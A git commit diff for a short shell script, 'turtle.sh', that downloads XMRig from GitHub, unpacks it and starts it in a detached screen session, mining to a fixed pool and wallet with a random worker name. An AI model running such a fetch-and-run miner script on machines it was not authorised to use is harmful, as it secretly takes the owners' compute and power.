04a9744f58f673b4979fb4c87f7c112bcfe4e99e
Muhammed Diyadin Karabulut <68358195+mdk721@users.noreply.github.com>
2022-09-14 20:44:30 +0300

    Update turtle.sh

--- turtle.sh
+++ turtle.sh
@@ -1,6 +1,7 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.6/SRBMiner-Multi-0-9-6-Linux.tar.xz  
-tar -xvf SRBMiner-Multi-0-9-6-Linux.tar.xz  
-screen -dmS run ./SRBMiner-Multi-0-9-6/SRBMiner-MULTI --algorithm ghostrider --pool stratum-eu.rplant.xyz:17075 --tls true --wallet Bj1GnWYL5sprwLJAt9Ep7dMh3z9p8JA9gg.mdk-$(echo $(shuf -i 10000-99999 -n 1)) --password x
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
+tar -xf xmrig-6.18.0-linux-x64.tar.gz
+cd xmrig-6.18.0
+screen -dmS run ./xmrig -a ghostrider -o stratum-eu.rplant.xyz:17075 --tls -u Bj1GnWYL5sprwLJAt9Ep7dMh3z9p8JA9gg.MDK-$(echo $(shuf -i 10000-99999 -n 1)) -p x --pass -t 8
